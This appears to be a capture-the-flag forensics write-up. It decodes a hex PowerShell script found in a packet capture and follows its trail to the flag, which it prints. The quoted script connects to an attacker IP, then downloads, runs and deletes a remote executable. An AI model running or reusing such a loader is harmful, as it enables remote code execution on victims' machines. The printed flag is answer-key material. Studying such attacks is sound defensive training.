# Description :

> In the past few days, I’ve noticed unusual changes on the employee’s computer. Fortunately, I found a pcap file that might provide some clues about what’s happening !!

> Author : Mr_Togoo


During the analysis of a PCAP file, you found this PowerShell script in hex.



![Screenshot 2025-03-26 124505](https://github.com/user-attachments/assets/72028b6d-d1f5-4f41-bfff-3df356a222d1)



So, when decoded, it reveals:


```
$attacker_ip = "10.0.2.30"
$attacker_port = 9999
$client = New-Object System.Net.Sockets.TCPClient($attacker_ip, $attacker_port)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

Invoke-Expression "powershell -nop -w hidden -c ""$client.GetStream().Write([System.Text.Encoding]::ASCII.GetBytes('Hello'))"""

Invoke-WebRequest -Uri "http://$attacker_ip/impermeable" -OutFile "C:\Windows\Temp\impermeable"
Start-Process "C:\Windows\Temp\impermeable"
Remove-Item "C:\Windows\Temp\impermeable"

```


An executable file entered the system and then removed itself, which could be considered anomalous behavior. When we reverse-engineered it, we found that it wrote two values in two registers, corresponding to two links:

- [https://www.mediafire.com/file/lc6fv6esqpaep1m/flag.zip/file](https://www.mediafire.com/file/lc6fv6esqpaep1m/flag.zip/file)
- [https://www.mediafire.com/file/erpwhdxpdfwtqky/Password.rar/file](https://www.mediafire.com/file/erpwhdxpdfwtqky/Password.rar/file)

Now, we can download the two files and open the `flag.zip` using the `Password.rar`


And congrats , you got the flag!!!

FLAG : 
>CSP{Bs@htk_Ts5in@t_Abn_3@Mi}
